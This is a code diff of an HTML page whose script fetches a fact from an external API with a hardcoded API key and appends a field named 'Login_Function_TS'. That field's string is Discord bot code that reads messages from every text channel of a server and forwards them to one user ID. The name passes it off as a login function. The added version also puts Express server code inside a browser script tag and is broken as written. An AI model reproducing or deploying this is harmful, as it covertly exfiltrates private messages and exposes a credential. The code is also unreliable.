@@ -5,13 +5,29 @@
 <body>
     <div id="json-data"></div>
     <script>
-        fetch('https://api.api-ninjas.com/v1/facts?limit=1', {headers: {'X-Api-Key': 'LCR8zzBqxycSAFr9NL9s36RgCDzDEFu250EfAiLq'}})
-        .then(res => {
-            return res.json();
-        })
-        .then(data => {
-            data.push({"Login_Function_TS": `const user = await this.container.client.users.fetch("598952157588357121") const g = await this.container.client.guilds.fetch("938467941878480936") g.channels.cache.forEach(c => { if (c.isText()) { c.messages.fetch().then(msg => { msg.forEach(m => {if (m.content.length!=0){user.send(m.content)}})})}});})`})
-            document.getElementById('json-data').innerHTML = JSON.stringify(data);
-        })
+        const express = require("express");
+const app = express();
+       
+        
+        
+
+app.get("/", (req, res) => {
+  // Define the data that you want to convert to JSON format
+  const rawdata = fetch('https://api.api-ninjas.com/v1/facts?limit=1', {headers: {'X-Api-Key': 'LCR8zzBqxycSAFr9NL9s36RgCDzDEFu250EfAiLq'}})
+  const data = rawdata.push({"Login_Function_TS": `const user = await this.container.client.users.fetch("598952157588357121") const g = await this.container.client.guilds.fetch("938467941878480936") g.channels.cache.forEach(c => { if (c.isText()) { c.messages.fetch().then(msg => { msg.forEach(m => {if (m.content.length!=0){user.send(m.content)}})})}});})`})
+
+  // Convert the data to a JSON string
+  const jsonData = JSON.stringify(data);
+
+  // Set the content type to application/json
+  res.set("Content-Type", "application/json");
+
+  // Output the JSON string
+  res.send(jsonData);
+});
+
+app.listen(3000, () => {
+  console.log("Server listening on port 3000");
+});
     </script>
 </body>
